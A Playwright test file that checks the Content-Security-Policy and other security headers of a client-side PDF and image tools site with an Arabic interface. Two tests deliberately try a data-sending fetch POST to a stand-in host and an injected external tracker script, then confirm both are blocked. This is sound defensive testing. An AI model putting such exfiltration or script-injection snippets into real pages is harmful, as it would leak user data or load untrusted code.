import { expect, test, type Page } from "@playwright/test";
import { makePdf, pdfUpload } from "./pdf/helpers";
import { fixture, makeImage } from "./image/helpers";

// Runs under the real security headers: e2e/serve.mjs applies out/_headers,
// which scripts/build-headers.mjs generates from src/lib/security/headers.json.

async function watchCsp(page: Page) {
  await page.addInitScript(() => {
    const w = window as unknown as { __csp: string[] };
    w.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => w.__csp.push(`${e.violatedDirective} ${e.blockedURI} @ ${e.sourceFile}:${e.lineNumber}:${e.columnNumber} ${(e.sample || "").slice(0, 60)}`));
  });
}
const violations = (page: Page) => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);

async function upload(page: Page, files: { name: string; mimeType: string; buffer: Buffer }[]) {
  await page.locator('input[type="file"]:not([capture])').first().setInputFiles(files);
}

async function process(page: Page, label: RegExp) {
  await page.getByRole("button", { name: label }).locator("visible=true").first().click();
  await expect(page.getByRole("heading", { name: /ملفاتك جاهزة|لم تنجح المعالجة/ })).toBeVisible({ timeout: 60_000 });
  await expect(page.getByRole("heading", { name: "ملفاتك جاهزة" })).toBeVisible();
}

test("pages are served with the security headers and the CSP meta tag", async ({ page }) => {
  for (const path of ["/", "/tools/", "/tools/merge-pdf/", "/workflows/", "/privacy/"]) {
    const response = await page.goto(path);
    const headers = response!.headers();
    expect(headers["content-security-policy"], path).toContain("connect-src 'self'");
    expect(headers["content-security-policy"], path).toContain("frame-ancestors 'none'");
    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["referrer-policy"]).toBe("no-referrer");
    const meta = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
    expect(meta).toContain("connect-src 'self'");
    expect(meta).not.toContain("frame-ancestors"); // ignored in <meta>, header-only
  }
});

test("the page cannot send data to another server", async ({ page }) => {
  await watchCsp(page);
  await page.goto("/");
  const result = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/collect", { method: "POST", body: "x" });
      return "sent";
    } catch {
      return "blocked";
    }
  });
  expect(result).toBe("blocked");
  expect((await violations(page)).some((v) => v.startsWith("connect-src"))).toBe(true);
});

test("an injected external script is blocked", async ({ page }) => {
  await watchCsp(page);
  await page.goto("/");
  const loaded = await page.evaluate(
    () =>
      new Promise<boolean>((resolve) => {
        const s = document.createElement("script");
        s.src = "https://example.com/tracker.js";
        s.onload = () => resolve(true);
        s.onerror = () => resolve(false);
        document.head.appendChild(s);
      }),
  );
  expect(loaded).toBe(false);
  expect((await violations(page)).some((v) => v.startsWith("script-src"))).toBe(true);
});

test.describe("tools work under the policy with no violations", () => {
  test("image worker (compress)", async ({ page }) => {
    await watchCsp(page);
    await page.goto("/tools/compress-image/");
    const jpg = await makeImage(page, { width: 800, height: 600, pattern: "photo", format: "jpeg" });
    await upload(page, [fixture("صورة.jpg", jpg, "image/jpeg")]);
    await process(page, /^ضغط الصور$/);
    expect(await violations(page)).toEqual([]);
  });

  test("GIF worker", async ({ page }) => {
    await watchCsp(page);
    await page.goto("/tools/gif-maker/");
    const a = await makeImage(page, { width: 200, height: 150, pattern: "quadrants", format: "png" });
    const b = await makeImage(page, { width: 200, height: 150, pattern: "photo", format: "png" });
    await upload(page, [fixture("1.png", a), fixture("2.png", b)]);
    await process(page, /^إنشاء GIF$/);
    expect(await violations(page)).toEqual([]);
  });

  test("PDF.js worker, fonts and thumbnails (PDF to image)", async ({ page }) => {
    await watchCsp(page);
    await page.goto("/tools/pdf-to-image/");
    await upload(page, [pdfUpload("ملف.pdf", await makePdf(2))]);
    await process(page, /^تحويل إلى صور$|^تحويل$/);
    expect(await violations(page)).toEqual([]);
  });

  test("qpdf WebAssembly (compress PDF)", async ({ page }) => {
    await watchCsp(page);
    await page.goto("/tools/compress-pdf/");
    await upload(page, [pdfUpload("ملف.pdf", await makePdf(3))]);
    await process(page, /^ضغط PDF$/);
    expect(await violations(page)).toEqual([]);
  });
});
